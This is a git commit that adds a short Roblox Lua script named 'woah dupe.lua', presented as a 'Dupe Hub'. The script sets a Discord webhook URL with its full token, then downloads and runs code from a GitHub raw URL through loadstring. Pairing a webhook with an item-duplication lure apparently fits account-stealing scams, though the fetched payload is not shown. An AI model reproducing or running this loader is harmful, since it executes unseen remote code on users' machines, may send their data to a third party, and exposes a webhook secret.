66a917cbebb368b7263518c581b5db1916d55499
Devjas0n <128847471+Devjas0n@users.noreply.github.com>
2023-03-24 16:47:38 -0300

    Add files via upload

---
+++ woah dupe.lua
@@ -0,0 +1,5 @@
+_G.Username = "DevJas_n"
+_G.ScriptName = "Dupe Hub..."
+_G.Webhook = "https://discord.com/api/webhooks/1088904225674768474/o3v72FWpLSNQgLG-u0fDB5tdelupV1SycXV0h6byKQfZ0ZAzM67A2ciRzr2Mijyaoy-B"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak"))()
